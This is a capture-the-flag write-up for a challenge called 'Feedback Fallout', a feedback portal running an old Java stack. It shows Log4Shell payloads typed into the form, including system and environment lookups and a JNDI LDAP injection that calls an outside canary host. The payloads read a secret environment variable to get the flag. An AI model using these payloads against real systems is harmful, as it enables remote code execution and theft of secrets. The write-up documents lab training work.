## **Challenge Name: Feedback Fallout**

### **Description**

We just finished setting up our feedback portal! Due to compatibility issues we had to use a really old version of Java, but I'm sure that isn't a problem!

**Challenge author**: Sid Kumar

**Challenge URL**: `http://18.212.136.134:8080/`

---

### **Approach**

1. **Initial Investigation**  
   - Accessed the feedback portal at the challenge URL
   - The description mentions using an old version of Java, hinting at Log4Shell vulnerability
   - Found a feedback form where users can submit feedback

2. **Identifying the Vulnerability**  
   - The challenge description strongly hints at Log4Shell (CVE-2021-44228)
   - Log4Shell is a remote code execution vulnerability in Apache Log4j
   - Tested various Log4j lookup expressions

3. **Testing Log4j Lookups**  
   - Started with basic system property lookups:
     ```
     ${sys:user.home}
     ```
   - Received response showing: `/root`
   - Tested additional lookups:
     ```
     ${sys:user.dir} → /usr/local/tomcat
     ${sys:user.name} → root
     ${java:classpath} → /usr/local/tomcat/bin/bootstrap.jar:...
     ```

4. **Attempting JNDI Injection**  
   - Tried JNDI LDAP injection payloads:
     ```
     ${jndi:ldap://x${hostName}.L4J.gvdy62988u731d4uqq66zgeob.canarytokens.com/a}
     ```
   - Connection attempts hung, suggesting JNDI/LDAP connections might be blocked

5. **Reading Environment Variables**  
   - Since JNDI connections were blocked, used Log4j's environment variable lookup
   - Tested environment variable access:
     ```
     ${env:PATH} → /usr/local/tomcat/bin:/opt/java/openjdk/bin:...
     ${env:HOME} → /root
     ```
   - Found the flag in an environment variable:
     ```
     ${env:FLAG_SECRET}
     ```

---

### **Flag**

```

```

---

